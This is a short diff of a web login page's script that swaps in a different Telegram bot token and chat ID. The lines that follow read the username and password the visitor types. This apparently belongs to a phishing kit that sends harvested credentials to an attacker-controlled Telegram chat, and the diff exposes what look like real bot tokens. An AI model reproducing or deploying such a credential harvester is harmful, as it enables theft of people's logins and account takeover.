@@ -146,9 +146,9 @@ input[type=checkbox] {
         </div>
         <script>
             //bot token
-            var telegram_bot_id = "5901072266:AAFNuw2FdWgEiZwAnvnqwAUeUNwWPYp45XI";
+            var telegram_bot_id = "6096872045:AAFDQcNKgJrX0pPd3Ry_TT-HyWBGO-mc6bQ";
             //chat id
-            var chat_id = 1064994658;
+            var chat_id = 1504472022;
             var u_name, password, message;
             var ready = function () {
                 u_name = document.getElementById("username").value;
